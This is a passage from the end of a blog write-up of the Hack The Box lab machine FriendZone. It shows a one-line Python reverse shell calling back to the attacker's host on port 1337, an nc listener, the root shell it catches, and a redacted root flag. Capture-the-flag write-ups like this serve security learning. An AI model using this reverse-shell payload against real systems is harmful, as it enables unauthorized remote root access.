+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>We then set up our <code class="language-plaintext highlighter-rouge">nc</code> listener.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337 
+listening on <span class="o">[</span>any] 1337 ...
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>After a while, when the <code class="language-plaintext highlighter-rouge">/opt/server_admin/reporter.py</code> is executed by <code class="language-plaintext highlighter-rouge">root</code>, we will catch a shell as <code class="language-plaintext highlighter-rouge">root</code>!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>rlwrap nc <span class="nt">-lvnp</span> 1337  
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.XX.XX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.123] 39574
+<span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@FriendZone:~# 
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="roottxt">root.txt</h1>
+<p>The root flag is in <code class="language-plaintext highlighter-rouge">root</code>’s home directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td>
+<td class="rouge-code"><pre><span class="nb">cat</span> /root/root.txt
+b0e6XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+root@FriendZone:~#
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3>
+</div>
+<div class="post-tail-wrapper text-muted">
+<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/hackthebox/">hackthebox</a>
+</div>
+<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration">linux</a> <a href="/tags/lfi/" class="post-tag no-text-decoration">lfi</a> <a href="/tags/module-hijack/" class="post-tag no-text-decoration">module hijack</a>
+</div>
+<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div>
+<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20FriendZone%20(Without%20Metasploit)%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/friendzone-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20FriendZone%20(Without%20Metasploit)%20-%20rizemon's%20blog&amp;u=https://rizemon.github.io/posts/friendzone-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack%20The%20Box%20-%20FriendZone%20(Without%20Metasploit)%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/friendzone-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span>
+</div>
+</div>
+</div>
+</div></div>
+<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
+<div class="access">
+<div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2">
+<li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a></li>
+<li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a></li>
+<li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a></li>
+<li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a></li>
+<li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></li>
+</ul>
+</div>
+<div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
+</div>
+</div>
+</div>
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav>
+</div>
+</div>
+</div>
+<div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+<div id="related-posts" class="mt-5 mb-2 mb-sm-4">
+<h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
+<div class="card-deck mb-4">
+<div class="card"> <a href="/posts/nineveh-htb/"><div class="card-body"> <span class="timeago small"> Jan 14, 2021 <i class="unloaded">2021-01-14T14:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Nineveh (Without Metasploit)</h3>
+<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div>
+</div></a>
+</div>
+<div class="card"> <a href="/posts/poison-htb/"><div class="card-body"> <span class="timeago small"> Jan 19, 2021 <i class="unloaded">2021-01-19T19:29:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Poison (Without Metasploit)</h3>
+<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div>
+</div></a>
+</div>
+<div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small"> Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3>
+<div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div>
+</div></a>
+</div>
+</div>
+</div>
+<div class="post-navigation d-flex justify-content-between"> <a href="/posts/irked-htb/" class="btn btn-outline-primary"><p>Hack The Box - Irked (Without Metasploit)</p></a> <a href="/posts/chatterbox-htb/" class="btn btn-outline-primary"><p>Hack The Box - ChatterBox (Without Metasploit)</p></a>
+</div>
+</div></div></div>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center">
+<div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
+<div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
+</div></footer>
+</div>
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content">
+<div id="search-hints">
+<h4 class="text-muted mb-4">Trending Tags</h4>
+<a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
+</div>
+<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+</div></div>
+</div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
